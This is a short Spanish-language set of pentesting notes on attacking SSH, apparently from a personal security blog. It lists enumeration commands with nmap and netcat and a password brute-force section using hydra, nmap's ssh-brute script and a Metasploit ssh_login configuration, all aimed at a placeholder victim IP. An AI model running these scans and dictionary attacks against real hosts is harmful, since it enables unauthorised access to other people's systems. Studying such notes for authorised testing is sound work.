---
title: 'Protocolo SSH'
description: 'Notas sobre cómo explotarlo'
pubDate: 2023-12-18
author: 'Nicolas Riquelme'
tags: ["Hacking", "Windows", "SSH", "shell", "discover", "Linux"]
tableOfContents:
  minHeadingLevel: 2
  maxHeadingLevel: 3
---
# SSH
SSH son las siglas para el protocolo de shell seguro (Secure Shell). Este protocolo usa por defecto el puerto 22 TCP. El protocolo SSH se basa en la arquitectura cliente-servidor, donde un cliente SSH se conecta a un servidor SSH. Las conexiones son cifradas para proteger los datos transferidos, lo que lo hace seguro para la transferencia de archivos, el acceso remoto a sistemas y la administración de sistemas.

## Enumeración
### Enumeración básica
```bash
ping {ip víctima}			 	# para ver si esta activa la red
nmap {ip víctima} 				# para ver los puertos abiertos
nmap -p22 -sV {ip víctima}		# para ver sólo la información del protocolo SSH
nc {ip víctima} 22				# netcat nos indicará lo que "se escucha" por el puerto 22
```
### Enumeración avanzada
```bash
nmap -p22 {ip víctima} --script ssh2-enum-algos												# nos indica los algoritmos que acepa el servidor SSH para la creación de las llaves
nmap -p22 {ip víctima} --script ssh-hostkey --script-args ssh_hostkey=full 					# nos da la clave RSA encriptada
nmap -p22 {ip víctima} --script ssh-auth-methods --script-args="ssh.user={usuario}" 		# nos indica los métodos de autenticación usados para los usuarios
```

## Explotación
### Ataques de diccionario
```bash
hydra -l {usuario} -P {path diccionario} {ip víctima} ssh
nmap -p22 {ip víctima} --script ssh-brute --script-args userdb={path archivo usuarios}

use auxiliary/scanner/ssh/ssh_login
	set RHOSTS {ip víctima}
	set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
	set STOP_ON_SUCCESS true
	set verbose true
	set threads 5
	run
```
